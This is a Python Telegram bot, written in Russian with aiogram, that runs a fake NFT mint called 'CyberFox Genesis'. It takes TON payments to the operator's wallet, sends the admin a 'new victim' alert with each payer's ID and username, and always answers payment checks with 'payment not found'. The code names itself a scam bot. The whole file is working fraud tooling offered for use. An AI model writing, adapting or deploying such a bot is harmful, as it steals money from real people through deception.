import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.storage.memory import MemoryStorage
import uuid
import time

# ===================== ТВОИ ДАННЫЕЕ =====================
BOT_TOKEN = "7777777777:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # токен бота

WALLET_TON = "UQBh1234567890abcdef1234567890abcdef1234567890abcdef"
WALLET_USDT = "0x1111111111111111111111111111111111111111"
WALLET_BTC = "bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
WALLET_ETH = "0x2222222222222222222222222222222222222222"

ADMIN_ID = 123456789  # твой ID

# ======================================================

bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher(storage=MemoryStorage())

def get_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✦ Mint NFT — 3.7 TON", callback_data="mint")],
        [InlineKeyboardButton(text="✦ Mint 5 NFT — 17 TON", callback_data="mint5")],
        [InlineKeyboardButton(text="My NFTs", callback_data="mynft")],
    ])

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "🔥 <b>EXCLUSIVE NFT DROP</b>\n\n"
        "Коллекция: <b>CyberFox Genesis</b>\n"
        "Всего 3333 NFT | Уже заминчено 2841\n\n"
        "Цена на публичном минте:\n"
        "•  1 NFT — 3.7 TON\n"
        "  5 NFT — 17 TON (скидка 8%)\n\n"
        "<i>Минт мгновенный — NFT сразу в кошельке</i>",
        reply_markup=get_menu()
    )

@dp.callback_query(F.data.startswith("mint"))
async def scam_mint(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or "NoUsername"

    if "5" in callback.data:
        amount = 17.0
        count = 5
    else:
        amount = 3.7
        count = 1

    comment = f"NFT{str(uuid.uuid4())[:8].upper()}"

    ton_link = f"ton://transfer/{WALLET_TON}?amount={int(amount*1000000000)}&text={comment}"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Оплатить TON", url=ton_link)],
        [InlineKeyboardButton(text="💳 USDT / Карта / BTC", url="https://t.me/CryptoBot?start=pay")],  # можешь заменить на свой инвойс
        [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_{user_id}_{int(time.time())}")],
    ])

    await callback.message.edit_text(
        f"🎫 <b>Заказ на {count} NFT</b>\n\n"
        f"Сумма: <b>{amount} TON</b>\n"
        f"Комментарий: <code>{comment}</code>\n\n"
        f"Кошелёк:\n<code>{WALLET_TON}</code>\n\n"
        "После подтверждения 1–2 минуты — NFT придут автоматически.",
        reply_markup=kb
    )

    await bot.send_message(ADMIN_ID,
        f"🟢 НОВАЯ ЖЕРТВА\n"
        f"ID: {user_id} | @{username}\n"
        f"Заказ: {count} NFT\n"
        f"Сумма: {amount} TON\n"
        f"Комментарий: {comment}"
    )

@dp.callback_query(F.data.startswith("check_"))
async def fake_check(callback: types.CallbackQuery):
    await callback.answer("Проверяем блокчейн TON... ⏳", show_alert=True)
    await asyncio.sleep(2.5)

    # ИСПРАВЛЕННАЯ КНОПКА — вот где была ошибка
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Проверить снова", callback_data=callback.data)]
    ])

    await callback.message.edit_text(
        "❌ Платёж пока не найден\n\n"
        "Проверь:\n"
        "• точная сумма\n"
        "• правильный комментарий\n"
        "• отправлено с TON-кошелька\n\n"
        "Попробуй через 30–60 секунд",
        reply_markup=kb
    )

@dp.callback_query(F.data == "mynft")
async def mynft(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🔍 Поиск твоих NFT в блокчейне...\n"
        "Ничего не найдено 😔\n\n"
        "Ты ещё не заминтил ни одного NFT\n"
        "Нажми кнопку ниже и купи первые!",
        reply_markup=get_menu()
    )

async def main():
    print("Скам-бот запущен и собирает TON 24/7")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())